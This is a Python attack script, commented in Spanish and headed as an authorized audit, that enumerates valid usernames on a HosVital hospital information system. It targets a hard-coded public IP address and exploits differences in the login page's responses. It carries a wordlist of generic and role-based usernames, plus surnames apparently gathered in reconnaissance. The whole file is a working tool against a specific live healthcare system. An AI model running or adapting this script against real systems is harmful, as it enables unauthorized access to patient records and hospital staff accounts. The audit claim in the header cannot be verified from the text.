#!/usr/bin/env python3
"""
ENUMERACION DE USUARIOS - HosVital HIS
Auditoria Autorizada - Cuidarte Tu Salud

Explota la diferencia de respuesta del login:
  - Usuario NO existe: ~9974 bytes + "El Usuario Ingresado No Existe"
  - Usuario SI existe: ~11178 bytes + muestra sedes (BOSQUE, ARMENIA, etc.)

Uso:
  python3 02_enum_users.py
  python3 02_enum_users.py -w wordlist.txt
  python3 02_enum_users.py -w wordlist.txt -t 10
"""

import requests
import sys
import argparse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET = "http://190.66.24.91:3155/WEBHOSREAL/servlet/login"

# Wordlist por defecto: usuarios comunes en sistemas hospitalarios colombianos
DEFAULT_USERS = [
    # Confirmados
    "PRUEBA", "hosvital",
    # Usuarios genericos comunes en HIS
    "ADMIN", "admin", "SISTEMA", "OPERADOR", "SOPORTE",
    "MEDICO", "ENFERMERA", "ADMISION", "FARMACIA", "LABORATORIO",
    "RADIOLOGIA", "URGENCIAS", "CONSULTA", "CITAS", "FACTURACION",
    "AUDITOR", "CALIDAD", "GERENCIA", "DIRECTOR", "SUPERVISOR",
    # Usuarios tipo prueba/desarrollo
    "TEST", "PRUEBA1", "PRUEBA2", "DEMO", "CAPACITACION",
    "USUARIO", "USUARIO1", "USER", "USER1",
    # Nombres propios (del reconocimiento)
    "NCANAS", "PMAHECHA", "CANAS", "MAHECHA",
    # Roles con variantes
    "ENFERMERA1", "MEDICO1", "ADMISION1",
    # Patrones tipicos DigitalWare/HosVital
    "HOSVITAL", "DIGITAL", "DIGITALWARE", "DW", "DWADMIN",
    "HIS", "HISADMIN", "WEBHOS", "WEBHOSREAL",
    # Sedes como posibles usuarios
    "BOSQUE", "ARMENIA", "PEREIRA", "EXCELENCIA",
]


def check_user(username, session=None):
    """Envia login con usuario y password falso, analiza la respuesta."""
    s = session or requests.Session()
    try:
        # Primero GET para obtener cookies y AJAX_SECURITY_TOKEN
        r = s.get(TARGET, timeout=15)
        cookies = s.cookies.get_dict()

        data = {
            "vUSUARIO1": username.upper(),
            "vCONTRASENA": "audit2026x",
            "vMODULO": "HC",
            "vCSEDENOM": "0",
            "GXState": '{"_EventName":"ENTER"}',
        }

        r = s.post(TARGET, data=data, timeout=15)
        body = r.text
        size = len(r.content)

        exists = "El Usuario Ingresado No Existe" not in body
        has_sedes = "BOSQUE" in body or "ARMENIA" in body

        return {
            "user": username.upper(),
            "exists": exists,
            "has_sedes": has_sedes,
            "size": size,
            "status": r.status_code,
        }
    except Exception as e:
        return {
            "user": username.upper(),
            "exists": None,
            "has_sedes": False,
            "size": 0,
            "status": str(e),
        }


def main():
    parser = argparse.ArgumentParser(description="Enumeracion de usuarios HosVital HIS")
    parser.add_argument("-w", "--wordlist", help="Archivo con lista de usuarios (uno por linea)")
    parser.add_argument("-t", "--threads", type=int, default=3, help="Hilos concurrentes (default: 3)")
    parser.add_argument("-d", "--delay", type=float, default=0.5, help="Delay entre requests en segundos")
    parser.add_argument("-o", "--output", default="enum_results.txt", help="Archivo de salida")
    args = parser.parse_args()

    users = DEFAULT_USERS
    if args.wordlist:
        with open(args.wordlist) as f:
            users = [line.strip() for line in f if line.strip()]

    print(f"[*] Target: {TARGET}")
    print(f"[*] Usuarios a probar: {len(users)}")
    print(f"[*] Hilos: {args.threads}")
    print(f"[*] Delay: {args.delay}s")
    print("=" * 70)
    print(f"{'USUARIO':<20} {'EXISTE':>8} {'SEDES':>8} {'BYTES':>8} {'STATUS':>8}")
    print("=" * 70)

    found = []
    not_found = []

    for user in users:
        result = check_user(user)
        status_str = "SI" if result["exists"] else ("NO" if result["exists"] is False else "ERR")
        sedes_str = "SI" if result["has_sedes"] else "NO"

        marker = ""
        if result["exists"]:
            marker = " <== ENCONTRADO"
            found.append(result)
        else:
            not_found.append(result)

        print(f"{result['user']:<20} {status_str:>8} {sedes_str:>8} {result['size']:>8} {result['status']:>8}{marker}")
        time.sleep(args.delay)

    print("=" * 70)
    print(f"\n[+] USUARIOS VALIDOS ENCONTRADOS: {len(found)}")
    for f_item in found:
        print(f"    {f_item['user']} ({f_item['size']} bytes, sedes={'SI' if f_item['has_sedes'] else 'NO'})")

    print(f"\n[-] Usuarios no existentes: {len(not_found)}")

    with open(args.output, "w") as out:
        out.write(f"# Enumeracion de usuarios - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        out.write(f"# Target: {TARGET}\n\n")
        out.write("## USUARIOS VALIDOS:\n")
        for f_item in found:
            out.write(f"{f_item['user']}\n")
        out.write("\n## USUARIOS NO EXISTENTES:\n")
        for nf in not_found:
            out.write(f"{nf['user']}\n")

    print(f"\n[+] Resultados guardados en: {args.output}")


if __name__ == "__main__":
    main()
